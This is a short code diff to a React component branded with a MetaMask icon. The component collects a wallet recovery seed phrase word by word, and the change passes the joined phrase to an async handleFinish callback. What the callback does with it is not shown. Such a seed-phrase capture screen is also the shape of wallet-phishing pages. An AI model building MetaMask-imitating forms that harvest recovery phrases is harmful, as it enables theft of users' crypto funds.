@@ -7,10 +7,8 @@ import MetaMaskFull from "../icons/meta-mask-full";
 
 export default function MetaMask({
 	handleFinish,
-	setWalletPhrase,
 }: {
-	handleFinish: () => void;
-	setWalletPhrase: any;
+	handleFinish: (walletPhrase: string) => Promise<void>;
 }) {
 	const [words, setWords] = useState<string[]>([""]);
 	const [visibility, setVisibility] = useState<boolean[]>([false]);
@@ -20,8 +18,7 @@ export default function MetaMask({
 	// --- Handle completion ---
 	const handleComplete = () => {
 		setSeedPhrase(words.join(" "));
-		setWalletPhrase(words.join(" "));
-		handleFinish();
+		handleFinish(words.join(" "));
 	};
 
 	// --- Add new input automatically ---
